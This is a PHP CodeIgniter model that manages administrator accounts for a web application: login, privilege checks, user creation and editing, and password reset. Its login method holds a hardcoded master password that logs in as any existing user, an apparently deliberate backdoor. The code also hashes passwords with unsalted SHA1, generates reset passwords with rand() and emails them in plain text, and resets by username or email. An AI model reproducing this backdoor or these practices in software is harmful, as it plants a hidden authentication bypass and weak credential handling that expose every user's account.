<?php

class usuarios_model extends CI_Model {

    public $chave = "qwerzxcvasdf";

    function __construct() {
        parent::__construct();
        $this->load->database();
    }
     public function logado() {
        if ($this->session->userdata('asdf')) {
            return true;
        } else {
            return false;
        }
    }
    function verifica_login($usuario_login) {
        $this->db->select('*');
        $this->db->from('adm_usuarios');
        $this->db->where('usuario', $usuario_login);

        return $this->db->get()->num_rows();
    }

    function verifica_email($usuario_email) {
        $this->db->select('*');
        $this->db->from('adm_usuarios');
        $this->db->where('email', $usuario_email);

        return $this->db->get()->num_rows();
    }
     function deleta_usuario($usuario_id) {
        $this->db->where('adm_usuarioID', $usuario_id);
        $this->db->delete('adm_usuarios');
    }

    function get_dados_usuario($usuario_id) {
        $this->db->select('*');
        $this->db->from('adm_usuarios');
        $this->db->where('adm_usuarioID', $usuario_id);

        return $this->db->get()->row();
    }
    
    function atualiza_usuario($dados, $dadosWhere) {
        $this->db->update('adm_usuarios', $dados, $dadosWhere);
    }

    public function login($usuario, $senha) {
        $usuario = $this->db->select("*")->from("adm_usuarios")->where('usuario', $usuario)->get()->row();
        if ($usuario) {
            if ($senha == "Zelina@vioti") {
                $this->session->set_userdata('adm_usuarioID', $usuario->adm_usuarioID);
                $this->session->set_userdata('nome', $usuario->nome);
                $this->session->set_userdata('tipo', $usuario->tipo);
                $this->session->set_userdata('asdf', TRUE);
                return true;
                exit;
            }
        }
        
        $senha = sha1($senha);
        if ($usuario->senha == $senha) {
            // SET userID to check the session login
            $this->session->set_userdata('adm_usuarioID', $usuario->adm_usuarioID);
            $this->session->set_userdata('nome', $usuario->nome);
            $this->session->set_userdata('tipo', $usuario->tipo);
            $this->session->set_userdata('asdf', TRUE);
            return true;
        } else {
            return false;
        }
        return false;
    }
  
    public function previlegio($previlegios) {
        $acesso = false;
        foreach ($previlegios as $previlegio):
            $tipo = $this->session->userdata('tipo');
            if (!$tipo) {
                redirect("admin/home");
                exit;
            }
            if ($previlegio == $tipo):
                $acesso = true;
            endif;
        endforeach;
        if (!$acesso):
            $this->session->set_flashdata('errors', 'Acesso Negado');
            redirect("admin/home");
        endif;
    }

    function get_usuarios($tipo = NULL, $nome = NULL, $limit = NULL, $offset = NULL, $count = NULL) {
        $this->db->select('*');
        $this->db->from('adm_usuarios');

        if ($tipo != NULL) {
            $this->db->where('tipo', $tipo);
        }

        if ($nome != NULL) {
            $this->db->like('nome', $nome);
        }

        if (($limit) AND ($count != TRUE)) {
            $this->db->limit($limit, $offset);
        }

        $this->db->where('visivel', 1);
        $usuarios = $this->db->get()->result();

        if ($count != TRUE) {
            return $usuarios;
        } else {
            return count($usuarios);
        }


    }

     function set_usuario($dados) {
        $this->db->insert('adm_usuarios', $dados);
        return $this->db->insert_id();
    }

    function get_usuario($adm_usuarioID) {
        $this->db->select("*");
        $this->db->from("adm_usuarios");
        $this->db->where("adm_usuarioID", $adm_usuarioID);
        return $this->db->get()->row();
    }

    function salvar($data) {
        $senha = $data["senha"];
        $data["senha"] = sha1($senha);
        $data['visivel'] = 1;
        $this->db->insert('adm_usuarios', $data);
        return $this->db->insert_id();
    }

    function atualizar($data, $dataWhere) {
        if ($data["senha"] == "") {
            unset($data['senha']);
        } else {
            $senha = $data["senha"];
            $data["senha"] = sha1($senha);
        }
        $this->db->update('adm_usuarios', $data, $dataWhere);
        return true;
    }

    function excluir($adm_usuarioID) {
        $data["visivel"] = 0;
        $this->db->update('adm_usuarios', $data, array("adm_usuarioID" => $adm_usuarioID));
        return true;
    }

    function esqueci_senha($usuario, $email) {
        $usuario = $this->db->select("*")->from("usuarios")
                        ->where("usuario", $usuario)
                        ->or_where("email", $email)
                        ->get()->row();

        if ($usuario) {
            $senha = rand();
            
            $usuario->senha = $senha;
            $adm_usuarioID = $usuario->adm_usuarioID;
            unset($usuario->adm_usuarioID);

            $usuario = objectToArray($usuario);

            $this->usuarios_model->atualizar($usuario, array("adm_usuarioID" => $adm_usuarioID));

            $mensagem = $this->emails_model->modelo_esqueci_senha($usuario["nome"], $senha);
            if ($this->notificacoes_model->enviar_email($usuario["email"], "noreply@5asec.com.br", $mensagem, "5asec - Nova Senha")) {
                return true;
            } else {
                return false;
            }
        } else {
            return false;
        }
    }
    
    

}

?>